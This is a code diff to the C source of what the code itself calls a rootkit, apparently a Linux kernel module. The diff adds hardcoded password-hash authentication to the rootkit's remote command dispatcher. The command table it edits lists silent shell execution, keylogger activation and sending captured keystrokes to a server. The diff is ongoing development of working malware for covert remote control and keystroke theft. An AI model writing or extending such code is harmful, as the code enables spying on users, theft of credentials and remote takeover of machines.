@@ -17,10 +17,22 @@ struct command {
     int (*cmd_handler)(char *args);
 };
 
+u8 passwd_hash[SHA256_DIGEST_SIZE] = {
+    0x5e, 0x7e, 0x56, 0x44, 0xa5, 0xeb, 0xfd,
+    0x8e, 0x3f, 0xd4, 0x2a, 0x26, 0xf1, 0x5b,
+    0xe3, 0xe7, 0x16, 0x6a, 0xc0, 0x22, 0x53,
+    0xb5, 0xb4, 0x2a, 0x99, 0x43, 0x11, 0xed,
+    0x09, 0x54, 0x99, 0x9d
+};
+
+bool is_auth = false;
+
 // Function prototypes
 int rootkit_command(char *command, unsigned command_size);
 
 // Handler prototypes
+int connect_handler(char *args);
+int disconnect_handler(char *args);
 int exec_handler(char *args);
 int klgon_handler(char *args);
 int klgoff_handler(char *args);
@@ -36,7 +48,9 @@ int help_handler(char *args);
 int rootkit_command(char *command, unsigned command_size);
 
 static struct command rootkit_commands_array[] = {
-    { "exec", 4, "execute a shell command. Usage : exec [-s for silent mode] [args*]", 20, exec_handler },
+    { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 50, connect_handler },
+    { "disconnect", 10, "disconnect user", 15, disconnect_handler },
+    { "exec", 4, "execute a shell command. Usage: exec [-s for silent mode] [args*]", 65, exec_handler },
     { "klgon", 6, "activate keylogger", 20, klgon_handler },
     { "klgoff", 7, "deactivate keylogger", 21, klgoff_handler },
     { "klg", 3, "send keylogger content to server", 35, klg_handler },
@@ -80,11 +94,17 @@ int rootkit_command(char *command, unsigned command_size) {
         return -EINVAL;
     }
 
-    int i;
+    if (!is_auth && strncmp(command, "connect", 7) != 0 && strncmp(command, "help", 4) != 0) {
+        send_to_server("You are not authentificated. See 'connect' command.\n");
+        return FAILURE;
+    }
+
     int ret_code = -EINVAL;
-    for (i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
-        if (strncmp(command, rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_name_size - 1) == 0) {
+    for (int i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
+        if (strncmp(command, rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_name_size) == 0) {
             char *args = command + rootkit_commands_array[i].cmd_name_size;
+            while (args[0] == ' ')
+                args++;
             ret_code = rootkit_commands_array[i].cmd_handler(args);
             return ret_code;
         }
@@ -94,6 +114,45 @@ int rootkit_command(char *command, unsigned command_size) {
     send_to_server("unknown command\n");
 
     return ret_code;
+}
+
+int connect_handler(char *args) {
+    if (is_auth) {
+        send_to_server("You are already authentificated.\n");
+        return is_auth;
+    }
+
+    DBG_MSG("password received: %s\n", args);
+
+    u8 hash[SHA256_DIGEST_SIZE] = { 0 };
+    hash_string(args, hash);
+    char hash_str[SHA256_DIGEST_SIZE * 2 + 1] = { 0 };
+    char passwd_hash_str[SHA256_DIGEST_SIZE * 2 + 1] = { 0 };
+
+    for (int i = 0; i < SHA256_DIGEST_SIZE; i++) {
+        snprintf(hash_str + i * 2, 3, "%02x", hash[i]);
+        snprintf(passwd_hash_str + i * 2, 3, "%02x", passwd_hash[i]);
+    }
+
+    DBG_MSG("computed hash: %s\n", hash_str);
+    DBG_MSG("expected hash: %s\n", passwd_hash_str);
+
+    if ((is_auth = are_hash_equals(passwd_hash, hash))) {
+        DBG_MSG("connect_handler: user authentificated\n");
+        send_to_server("User authentificated\n");
+    }
+    else {
+        ERR_MSG("connect_handler: error while authentificating user\n");
+        msleep(2 * TIMEOUT_BEFORE_RETRY);
+        send_to_server("Error while authentificating.\n");
+    }
+    return is_auth;
+}
+
+int disconnect_handler(char *args) {
+    is_auth = false;
+    send_to_server("User successfully disconnected.\n");
+    return is_auth;
 }
 
 int exec_handler(char *args) {
